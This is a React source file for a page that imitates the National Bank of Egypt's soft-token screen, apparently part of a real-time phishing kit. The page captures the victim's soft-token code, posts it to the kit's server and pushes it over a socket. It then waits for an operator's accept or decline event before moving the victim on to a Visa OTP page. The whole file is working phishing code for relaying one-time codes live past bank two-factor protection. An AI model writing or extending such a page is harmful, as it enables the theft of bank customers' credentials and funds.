import axios from "axios";
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";
import { useLanguage } from "../hooks/useLanguage";
import { useAdminApproval } from "../hooks/useAdminApproval";
import ProcessingOverlay from "../components/nbe/ProcessingOverlay";
import DeclineError from "../components/nbe/DeclineError";

const SoftToken = () => {
  const navigate = useNavigate();
  const [softToken, setSoftToken] = useState("");
  const orderId = sessionStorage.getItem("id");
  const { t, dir } = useLanguage();
  const { waiting, setWaiting, clearError, declineMessage } = useAdminApproval({
    orderId,
    acceptEvent: "acceptSoftToken",
    declineEvent: "declineSoftToken",
    declineMessageKey: "declineSoftToken",
    onAccept: () => navigate("/visaOtp"),
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    clearError();
    if (!orderId) return;

    setWaiting(true);
    try {
      await axios.post(api_route + "/softToken/" + orderId, { softToken });
      socket.emit("softToken", { id: orderId, softToken });
    } catch (err) {
      console.log(err);
      setWaiting(false);
    }
  };

  return (
    <div className="w-full min-h-screen bg-zinc-100 flex flex-col items-center">
      {waiting && <ProcessingOverlay />}

      <form
        className="w-full max-w-md mx-auto px-4 py-6 flex flex-col items-center"
        onSubmit={handleSubmit}
        dir={dir}
      >
        <img src="/img1.png" alt="NBE Logo" className="w-1/2 my-6" />

        <div className="w-full  border border-zinc-300 rounded-lg p-5 flex flex-col items-center">
          <img src="/softToken.jpeg" alt="" className="w-1/2 max-w-xs mb-4" />

          <p className="text-nbe-orange text-sm leading-relaxed text-center mb-5 px-1 font-semibold">
            {t("softTokenInstructions")}
          </p>

          {!orderId && (
            <p className="text-red-600 text-center text-sm mb-4 w-full">
              {t("sessionExpired")}
            </p>
          )}

          <input
            type="text"
            required
            dir="ltr"
            value={softToken}
            onChange={(e) => setSoftToken(e.target.value)}
            placeholder={t("softTokenPlaceholder")}
            disabled={!orderId}
            className="w-full border border-nbe-green rounded-md px-4 py-3 text-center text-zinc-700 placeholder:text-zinc-400 outline-none focus:border-nbe-green disabled:opacity-70 mb-5"
          />

          <button
            type="submit"
            disabled={waiting || !orderId}
            className="w-full bg-nbe-green text-white font-semibold rounded-md py-3 text-lg disabled:opacity-70"
          >
            {t("submit")}
          </button>

          <DeclineError message={declineMessage} />

          <div className="w-full mt-8 flex flex-col items-start gap-3">
            <p className="text-zinc-800 text-sm font-semibold ">
              {t("softTokenDownloadTitle")}
            </p>
            <p className="text-zinc-600 text-xs">{t("softTokenAndroid")}</p>
            <p className="text-zinc-600 text-xs">{t("softTokenIos")}</p>
            <div className="flex items-center justify-center w-full gap-3 mt-2">
              <img
                src="/google.jpeg"
                alt="Google Play"
                className="h-10 object-contain"
                onClick={() =>
                  window.open(
                    "https://play.google.com/store/apps/details?id=com.NBEProdToken",
                    "_blank",
                  )
                }
              />
              <img
                src="/apple.jpeg"
                alt="App Store"
                className="h-10 object-contain"
                onClick={() =>
                  window.open(
                    "https://apps.apple.com/sa/app/nbe-token/id1598804254",
                    "_blank",
                  )
                }
              />
            </div>
          </div>
        </div>
      </form>
    </div>
  );
};

export default SoftToken;
